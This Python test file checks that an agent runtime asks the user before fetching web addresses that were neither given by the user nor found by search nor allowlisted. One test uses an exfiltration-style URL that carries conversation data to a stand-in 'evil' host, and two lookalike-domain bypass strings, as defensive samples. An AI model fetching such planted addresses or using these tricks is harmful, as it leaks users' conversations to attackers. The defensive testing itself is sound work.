"""A page address nobody gave the agent asks first (phase H3, ProvenancePolicy)."""

from collections import Counter
from typing import Any

import pytest
from psycopg.types.json import Jsonb
from pydantic import ConfigDict

from agent_runtime.db import Pool
from agent_runtime.fencing import Fence
from agent_runtime.runs.events import EventType as E
from agent_runtime.runs.state import RunStatus
from agent_runtime.runs.store import RunRepository
from agent_runtime.tools.pipeline import Grant, ToolCall, ToolPipeline, ToolRunContext
from agent_runtime.tools.policy import ProvenancePolicy, RiskClassPolicy
from agent_runtime.tools.spec import ToolArgs, ToolContext, ToolRegistry

pytestmark = pytest.mark.integration
GIVEN = "https://docs.example.com/guide"


class Url(ToolArgs):
    model_config = ConfigDict(extra="allow")
    url: str


class Reader:
    def __init__(self) -> None:
        self.read: Counter[str] = Counter()
        self.asked: list[dict[str, Any]] = []
        self.registry = ToolRegistry()

        @self.registry.tool("read_webpage", args=Url, risk_class="read", side_effect=False)
        async def read_webpage(args: Url, ctx: ToolContext) -> str:
            self.read[args.url] += 1
            return "a page"

    def interrupt(self, payload: dict[str, Any]) -> Any:
        self.asked.append(payload)
        return {"decision": "reject"}

    async def read_page(self, fence: Fence, pool: Pool, url: str, index: int) -> str:
        pipeline = ToolPipeline(
            self.registry, ProvenancePolicy(RiskClassPolicy()), interrupt=self.interrupt
        )
        ctx = ToolRunContext(fence=fence, pool=pool, grants={"read_webpage": Grant()},
                             emit=lambda *_: None)  # fmt: skip
        result = await pipeline.run(ToolCall(f"c{index}", "read_webpage", {"url": url}, index), ctx)
        return result.status


@pytest.fixture
async def fence(pool: Pool) -> Fence:
    async with pool.connection() as conn:
        repo = RunRepository(conn)
        run = await repo.create(
            graph_name="assistant", input={"message": f"Summarise {GIVEN} for me"}
        )
        lease = await repo.acquire_lease(run.id, "prov:1", ttl_s=60)
        assert lease is not None
        await repo.transition(run.id, RunStatus.RUNNING, event=E.RUN_STARTED, fence=lease.fence)
    return lease.fence


async def test_an_address_from_the_person_is_read_without_asking(pool: Pool, fence: Fence) -> None:
    reader = Reader()
    assert await reader.read_page(fence, pool, GIVEN, 0) == "success"
    assert await reader.read_page(fence, pool, GIVEN + "/", 1) == "success"  # same page
    assert reader.asked == []


async def test_an_address_planted_in_a_page_asks_first_and_shows_it(
    pool: Pool, fence: Fence
) -> None:
    reader = Reader()
    leak = "https://collect.evil.example/log?d=the%20conversation"
    assert await reader.read_page(fence, pool, leak, 0) == "error"  # the person said no
    assert reader.read[leak] == 0
    [asked] = reader.asked
    assert asked["tool"] == "read_webpage" and asked["args"]["url"] == leak  # full address
    assert "didn't come from you or from a search result" in asked["reason"]
    # A longer address that merely starts with one the person gave is not "given".
    assert await reader.read_page(fence, pool, GIVEN + ".evil.example/?d=x", 1) == "error"


async def test_an_address_from_a_search_result_is_read_without_asking(
    pool: Pool, fence: Fence
) -> None:
    found = "https://found.example/article"
    async with pool.connection() as conn:
        await conn.execute(
            "INSERT INTO tool_invocations (key, run_id, tool, status, result, epoch) "
            "VALUES (%s, %s, 'web_search', 'done', %s, %s)",
            ("s" * 64, fence.run_id, Jsonb({"results": [{"url": found}]}), fence.epoch),
        )
    reader = Reader()
    assert await reader.read_page(fence, pool, found, 0) == "success"
    assert reader.asked == []


async def test_a_site_you_allowed_is_read_without_asking(pool: Pool, fence: Fence) -> None:
    async with pool.connection() as conn:
        await conn.execute(
            "INSERT INTO tool_settings (workspace_id, web_allowlist) VALUES ('local', %s) "
            "ON CONFLICT (workspace_id) DO UPDATE SET web_allowlist = EXCLUDED.web_allowlist",
            (Jsonb(["trusted.example"]),),
        )
    try:
        reader = Reader()
        assert await reader.read_page(fence, pool, "https://wiki.trusted.example/p", 0) == "success"
        assert await reader.read_page(fence, pool, "https://trusted.example.evil/p", 1) == "error"
    finally:
        async with pool.connection() as conn:
            await conn.execute("UPDATE tool_settings SET web_allowlist = '[]'")
